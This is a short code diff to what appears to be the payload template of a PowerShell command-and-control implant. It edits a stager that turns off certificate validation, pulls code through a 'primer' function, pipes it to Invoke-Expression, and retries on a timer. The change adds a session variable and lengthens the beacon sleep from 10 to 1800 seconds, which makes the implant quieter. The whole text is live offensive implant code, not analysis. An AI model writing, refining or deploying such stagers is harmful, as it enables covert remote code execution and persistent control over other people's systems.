@@ -1149,7 +1149,8 @@ $sleeptime = '+$defaultbeacon+'
 
 $payloadclear = @"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
-`$S="$s"
+`$s="$s"
+`$sc="$sc"
 function DEC {${function:DEC}}
 function ENC {${function:ENC}}
 function CAM {${function:CAM}}
@@ -1157,7 +1158,7 @@ function Get-Webclient {${function:Get-Webclient}}
 function Primer {${function:primer}}
 `$primer = primer
 if (`$primer) {`$primer| iex} else {
-start-sleep 10
+start-sleep 1800
 primer | iex }
 "@
 
